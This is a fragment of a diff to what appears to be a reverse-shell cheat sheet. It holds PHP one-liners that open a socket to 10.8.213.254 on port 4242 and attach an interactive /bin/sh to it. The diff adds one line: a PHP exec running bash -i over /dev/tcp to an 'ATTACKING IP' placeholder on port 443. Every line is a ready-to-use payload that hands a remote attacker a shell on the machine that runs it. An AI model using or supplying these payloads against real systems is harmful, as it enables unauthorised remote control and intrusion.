@@ -173,6 +173,8 @@ php -r '$sock=fsockopen("10.8.213.254",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r
 
 ```bash
 php -r '$sock=fsockopen("10.8.213.254",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1'");?>
+
 ```
 
 ```
